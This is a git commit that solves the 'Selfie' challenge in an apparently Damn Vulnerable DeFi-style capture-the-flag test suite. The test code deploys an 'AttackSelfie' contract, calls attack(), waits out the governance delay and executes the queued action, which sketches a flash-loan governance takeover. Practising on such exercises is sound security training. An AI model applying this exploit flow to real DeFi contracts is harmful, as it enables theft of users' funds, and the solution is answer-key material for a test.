4eaf37a4919c861638fa0f36d2dfbab57b65c51e
Iftikhar uddin <iftipro@gmail.com>
2023-11-19 18:40:12 +0500

    Selfie Challenge Solved

--- test/selfie/selfie.challenge.js
+++ test/selfie/selfie.challenge.js
@@ -40,6 +40,14 @@ describe('[Challenge] Selfie', function () {
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
 
+        this.attackContract = await (await ethers.getContractFactory("AttackSelfie", player)).deploy(
+            pool.address, governance.address, token.address
+        );
+        await this.attackContract.attack();
+        const ACTION_DELAY = 3 * 24 * 60 * 60 + 1;
+        await time.increase(ACTION_DELAY);
+        await governance.connect(player).executeAction(1);
+
     });
 
     after(async function () {
